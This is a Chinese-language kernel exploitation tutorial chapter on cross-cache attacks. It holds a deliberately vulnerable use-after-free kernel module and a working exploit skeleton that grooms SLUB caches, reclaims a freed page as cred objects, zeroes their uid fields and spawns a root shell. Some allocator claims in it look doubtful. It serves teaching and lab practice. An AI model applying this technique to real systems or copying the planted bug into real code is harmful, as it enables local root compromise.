# Ch 13 — Cross-Cache Attack：跨 kmalloc cache 打 dedicated slab

> 目標：現代 kernel 把很多敏感 struct（`cred`、`file`、`task_struct`）丟進 dedicated cache，你在 `kmalloc-256` 的 UAF 按理打不到。Cross-cache 利用 slab page 被 buddy allocator 回收、再被另一個 cache 拿去用這個窗口，把攻擊跨過去。這章把這個窗口打開的精確時序講清楚。

## 為什麼 Ch 11 的 spray 物件不夠用

Ch 11 講的 spray 物件全是「kmalloc-N」的：`msg_msg`、`tty_struct`、`user_key_payload` 都進通用 kmalloc cache。

但近年的高價值 victim 不在 kmalloc cache：

| Victim | 在哪個 cache |
|---|---|
| `cred` | `cred_jar`（dedicated） |
| `task_struct` | `task_struct` cache（dedicated） |
| `mm_struct` | `mm_struct` cache |
| `file` | `filp` cache |
| `pid` | `pid` cache |
| `nft_*`（部分） | `kmalloc-cg-*`（accounted），但有 `nft_table` 等 dedicated |

如果你的 UAF chunk 在 `kmalloc-256`，你 spray 一千個 `cred` 也打不進去 — 它們進 `cred_jar` 不是 `kmalloc-256`。

所以你需要 **cross-cache**：強制讓 `kmalloc-256` 的某個 slab page**整個還給 buddy allocator**，然後讓 `cred_jar` 從 buddy 拿這同一個物理 page，這樣同一段記憶體現在就是 `cred_jar` 的物件了。你 UAF 的 dangling pointer 跨進了 `cred_jar`。

## SLUB 是怎麼把整個 slab 還回去的

回顧 Ch 3：SLUB 的 slab 是一塊 page-order N 的記憶體（通常 1 個 page = 4K，但大物件 cache 會用 order > 0）。slab 上的每個物件可獨立 alloc/free，但**整個 slab page 還給 buddy 的條件**：

1. 該 slab 的所有物件都 free 了
2. SLUB 的 partial list 容量已滿，這個全空 slab 不再保留
3. 該 cache 沒有把它 keep 在 per-cpu cache

換句話說：**只要這個 cache 的所有 slab 都不空、freelist 太短，就不會還 page**。所以你要先**人為把目標 cache 的所有 slab 排成「只剩下你的 victim slab 上有物件、其他 slab 全空、partial list 已滿」的狀態**。

「人為布局 SLUB 直到目標 slab 是孤兒」就是 **slab grooming**，Ch 13 的核心。

## Cross-cache 的標準時序

教科書版（要背下來）：

```
1. spray 目標 source cache（你的 UAF cache，例如 kmalloc-256）的非 victim 物件
   → 把所有 partial slab 填滿，per-cpu freelist 拉長
2. trigger UAF / vuln：alloc 一個 victim object（你之後要 free 這個）
3. 繼續 spray，把 victim 物件後面的 chunk 全部填滿
   → victim 所在的 slab 變成「只剩 victim 是 dangling」
4. free 所有非 victim 物件 在這個 slab 上的
   → slab 變成「整個都空，除了 dangling」
   → SLUB 標 slab 為 empty
5. 觸發 SLUB 把這個 page 還給 buddy
   → free 額外的物件、讓這個 slab 滑出 partial list
6. 從 dest cache（例如 cred_jar）大量 alloc
   → kernel 從 buddy 拿 page → 命中你剛丟回去的那塊
7. dangling pointer 現在指向 dest cache 的物件（cred）
8. 對 dangling pointer 寫 → 改了 cred 的 uid/gid → root
```

每一步都會卡。以下逐步拆解。

## Step 1：用什麼當 source cache 的 padding

你需要大量、size 對的、可由 user 控制的 alloc：

- **`msg_msg`** payload 調對 size（Ch 11）
- **`user_key_payload`**
- **`pipe_buffer`** 系列（注意：pipe_buffer alloc 的是 page-aligned，size 是 1024 但會 cluster）

挑能讓你「精確控制 alloc/free 時序」的。`msg_msg` 最好用：每個 msgsnd 一次 alloc，msgrcv 一次 free，one-to-one。

## Step 2：怎麼確認「整個 slab 已被回收給 buddy」

你看不到 `/proc/slabinfo` 的物理地址 — 你需要間接手段。常見訊號：

1. **dest cache 大量 alloc 後，dangling read 拿到的內容變了形**（從 source cache 物件 layout 變成 dest cache 物件 layout）
2. **特定 spray pattern 出現 — alloc N 個 dest 物件後，第 K 個（K 是你算出來的）地址跟 dangling pointer 對齊**

實務上跑 exploit 的時候你**不太能驗證**這一步成功；你寫好整套，看最終 result（拿到 root 沒）來判斷整套是否走通。

## Step 3：spray 數量的試算

假設：

- source cache（kmalloc-256）：每 slab 容納 16 個物件，per-cpu cache 能放 N1 個 slab
- dest cache（cred_jar）：每 slab 容納 32 個物件

**source 端 spray** = `(per-cpu slabs + partial slabs + 1) × 物件數 / slab + safety_margin`

實務值：每個 cache 要先 spray **數百到一千個** padding object 才能把 partial list 排滿，再 free 那一輪去觸發 page free。具體值看 kernel build。

**dest 端 alloc** = 你要的物件數。`fork()` 是觸發 cred alloc 最直接的，但每次 fork 一個物件你太慢；用 `userfaultfd` + `clone(CLONE_VM)` 能拉到一秒幾百個。

## Step 4：什麼時機 free padding？

關鍵心法：**先 free「victim 之後 alloc 的 padding」**。

為什麼：SLUB freelist 是 LIFO（後 free 的先 alloc 出去）。如果你的 victim slab 是「victim 在中間、前後都有 padding」，你必須**精確 free 那個 slab 上 victim 以外的所有物件**。後 alloc 的 padding 最有可能跟 victim 在同 slab。

實作上的常見 pattern：

```c
/* 階段 A：先填 partial slab */
for (i = 0; i < 200; i++) padding_pre[i] = spray_alloc();

/* 階段 B：alloc victim */
victim = trigger_vuln_alloc();

/* 階段 C：在 victim 後 alloc 一批 — 這批最可能跟 victim 同 slab */
for (i = 0; i < 200; i++) padding_post[i] = spray_alloc();

/* 階段 D：free victim 自己（不是 dangling 的那邊，是 vuln 物件） */
trigger_vuln_free();
/* 此時 victim 的 chunk 已 free，但你還有一個 dangling reference */

/* 階段 E：free padding_post（同 slab 的鄰居） */
for (i = 0; i < 200; i++) spray_free(padding_post[i]);

/* 階段 F：free padding_pre 不一定要全 free，但通常多 free 把 page 變空 */
for (i = 0; i < 200; i++) spray_free(padding_pre[i]);

/* 階段 G：dest cache spray */
for (i = 0; i < 1000; i++) trigger_dest_alloc();   /* fork() / open() / clone() 等 */

/* 階段 H：對 dangling pointer 做 write，覆寫 dest cache 物件 */
write_dangling(payload);

/* 階段 I：成功的話，某個 dest 物件被搞了 */
```

## Step 5：dest cache 的 alloc 觸發

| Dest | 觸發 alloc 的 syscall |
|---|---|
| `cred_jar` | `fork()` / `clone(CLONE_VM)` |
| `filp` | `open()` |
| `pid` | `fork()` |
| `nft_set_elem_cache` | netlink + nf_tables batch（Ch 19） |
| `anon_inode_cache` | `eventfd()` / `userfaultfd()` |

`fork()` 最通用但每次只 alloc 一個 `cred`；用 thread pool 批次 `clone(CLONE_VM|CLONE_FILES)` 可以拉到每秒幾百個。

## Step 6：失敗原因與診斷

**現象：dangling write 後系統 crash（GPF）**
原因 A：page 還沒被 dest cache 拿走，你寫進了 buddy 認為「空的」page。
修法：在 dest alloc 前加 `usleep(5000)`，或增加 dest spray 數量。

**現象：exploit 跑完但 cred 沒變**
原因 B：spray 量不夠，page 落到別的 dest slab，不是你的 dangling pointer 那個。
診斷：`/proc/slabinfo | grep cred_jar`，看 active_objs 在 fork 後有沒有明顯跳動。

**現象：成功率 10-30%**
原因 C：buddy allocator 把 page 給了其他 size 的 cache。
修法：整個 exploit 用 `sched_setaffinity` pin 到 CPU 0，減少 per-cpu cache 的不確定性；或增加 dest spray 量到 2000+。

**現象：`fork()` 回 `-ENOMEM`**
spray 太暴力，系統 OOM。通常幾百到一千個 fork 就夠，不要無上限。

## 實戰技巧

### 用 userfaultfd 擴大時間窗口

```c
/* 在 dest alloc 路徑上掛 userfaultfd page fault handler */
/* handler 觸發時 kernel 暫停 — 此時去做 dangling write */
/* handler 返回後 kernel 繼續把 page 交給 dest cache */
```

讓「dangling write」與「dest cache 拿到 page」之間有確定性同步點，成功率大幅提升。

### drain per-cpu freelist

free 大量物件後，呼叫 `mprotect(addr, 0x1000, PROT_READ)` 可以觸發 kernel 把 per-cpu cache drain 到 node partial list，幫助 SLUB 更快把 slab 還給 buddy。

## Vulnerable Module

```c
/* vuln_cross.c：kmalloc-256 UAF */
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/slab.h>
#include <linux/miscdevice.h>

#define VULN_ALLOC  _IO('V', 1)
#define VULN_FREE   _IO('V', 2)
#define VULN_WRITE  _IOW('V', 3, unsigned long)

static char *g_chunk = NULL;

static long vuln_ioctl(struct file *f, unsigned int cmd, unsigned long arg)
{
    switch (cmd) {
    case VULN_ALLOC:
        g_chunk = kmalloc(256, GFP_KERNEL_ACCOUNT);
        return 0;
    case VULN_FREE:
        kfree(g_chunk);      /* dangling: g_chunk 不清 NULL */
        return 0;
    case VULN_WRITE: {
        char buf[256];
        if (copy_from_user(buf, (void __user *)arg, 256))
            return -EFAULT;
        memcpy(g_chunk, buf, 256);   /* write-after-free */
        return 0;
    }}
    return -EINVAL;
}

static struct file_operations vuln_fops = { .unlocked_ioctl = vuln_ioctl };
static struct miscdevice vuln_dev = {
    .minor = MISC_DYNAMIC_MINOR, .name = "vuln_cross", .fops = &vuln_fops,
};
static int __init m_init(void) { return misc_register(&vuln_dev); }
static void __exit m_exit(void) { misc_deregister(&vuln_dev); }
module_init(m_init); module_exit(m_exit);
MODULE_LICENSE("GPL");
```

注意用 `GFP_KERNEL_ACCOUNT`：有 `__GFP_ACCOUNT` 的 allocation 走 `kmalloc-cg-*`（accounted cache），與 `cred_jar` 同一家族，cross-cache 更容易。

## Exploit 骨架（cross-cache → cred_jar → uid=0）

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <sys/wait.h>

#define VULN_ALLOC  _IO('V', 1)
#define VULN_FREE   _IO('V', 2)
#define VULN_WRITE  _IOW('V', 3, unsigned long)

/* struct cred 簡化 layout（kernel 6.x x86-64）
 * offsetof(struct cred, uid) = 4（usage refcount 在 offset 0）*/
#define CRED_UID_OFF 4

static void pin_cpu(int n) {
    cpu_set_t mask; CPU_ZERO(&mask); CPU_SET(n, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

int main(void)
{
    pin_cpu(0);
    int fd = open("/dev/vuln_cross", O_RDWR);

    /* ── 階段 1：spray padding → 把 kmalloc-256 partial list 填滿 ── */
    int qid = msgget(IPC_PRIVATE, 0666|IPC_CREAT);
    struct { long mtype; char text[192]; } snd = {.mtype = 1};
    /* msg_msg header 48B + 192B payload = 240B → 落在 kmalloc-256 */
    for (int i = 0; i < 500; i++)
        msgsnd(qid, &snd, sizeof(snd.text), 0);

    /* ── 階段 2：alloc victim（UAF object） ── */
    ioctl(fd, VULN_ALLOC, 0);

    /* ── 階段 3：victim 後再 spray，把 victim slab 填滿 ── */
    for (int i = 0; i < 500; i++)
        msgsnd(qid, &snd, sizeof(snd.text), 0);

    /* ── 階段 4：free victim（dangling pointer 留著） ── */
    ioctl(fd, VULN_FREE, 0);

    /* ── 階段 5 & 6：free 所有 padding → slab 全空 → 還給 buddy ── */
    struct { long mtype; char text[256]; } rcv;
    for (int i = 0; i < 1000; i++)
        msgrcv(qid, &rcv, sizeof(rcv.text), 0, IPC_NOWAIT|MSG_NOERROR);

    /* ── 階段 7：dest spray — fork 觸發 cred_jar alloc ── */
    pid_t children[1200];
    for (int i = 0; i < 1200; i++) {
        children[i] = fork();
        if (children[i] == 0) {
            sleep(3);
            if (getuid() == 0) {
                puts("[+] got root in child!");
                execl("/bin/sh", "sh", NULL);
            }
            _exit(0);
        }
    }

    /* ── 階段 8：UAF write — dangling chunk 當 cred 寫 ── */
    char payload[256];
    memset(payload, 0, sizeof(payload));
    /* cred->usage（refcount）保留 1，uid/gid/euid/egid/fsuid/fsgid = 0 */
    *(unsigned int *)payload = 1;   /* usage */
    /* +4 到 +36 全 0（已 memset）→ 所有 id 欄位 = 0 = root */
    ioctl(fd, VULN_WRITE, (unsigned long)payload);

    printf("[*] payload fired — waiting for root child\n");
    for (int i = 0; i < 1200; i++)
        waitpid(children[i], NULL, 0);
    return 0;
}
```

成功率取決於 spray 量與 kernel 版本的 `cred` layout。在 QEMU + GDB 下用 `ptype struct cred` 確認 offset，再調整 payload。

## 動手練習

1. **數 cred layout**：`gdb vmlinux`，`ptype struct cred`，找出 `uid`、`euid`、`cap_effective` 的 byte offset，確認 payload 寫對位置。
2. **調 spray 量**：從 100 → 500 → 1200 各跑一次，`cat /proc/slabinfo | grep cred_jar` 觀察 active_objs 變化，找到命中 threshold。
3. **加 userfaultfd**：把 VULN_WRITE 這步改成帶 userfaultfd 的版本，在 page fault 時才寫 — 成功率有沒有提升？
4. **換 dest cache**：把 dest 從 `cred_jar` 換成 `filp`（用 `open("/dev/null",...)` 噴），觀察 exploit 骨架哪裡要改、size 對不對。
5. **GDB 驗 physical page 重用**：在 QEMU 裡 `info mem` + SLUB debug，確認 dangling pointer 的物理地址和某個 child 的 cred 物理地址相同。

## 自我檢核

- [ ] 能畫出 cross-cache 六步時序（spray source → victim → spray post → free victim → free padding → dest spray）
- [ ] 知道 SLUB 把整個 slab page 還給 buddy 的三個條件
- [ ] 能解釋為什麼 `cred_jar` 不在 `kmalloc-256`
- [ ] 知道 dest spray 量怎麼估（slab 容量 × partial list 深度）
- [ ] 知道 exploit 成功率低的三個常見原因及各自修法
- [ ] 能解釋 `GFP_KERNEL_ACCOUNT` 和 `GFP_KERNEL` 的 cache 差異

下一章放棄 RIP 控制路，改走純改 data — Dirty Pagetable 把 PTE 直接改掉拿到任意實體記憶體 R/W；Dirty Cred 直接改 `cred` struct。兩個技術在 CFI 時代都還有效。

→ [Ch 14 — Dirty Pagetable / Dirty Cred：不經 ROP 拿任意 R/W](./14-dirty-pagetable-cred.md)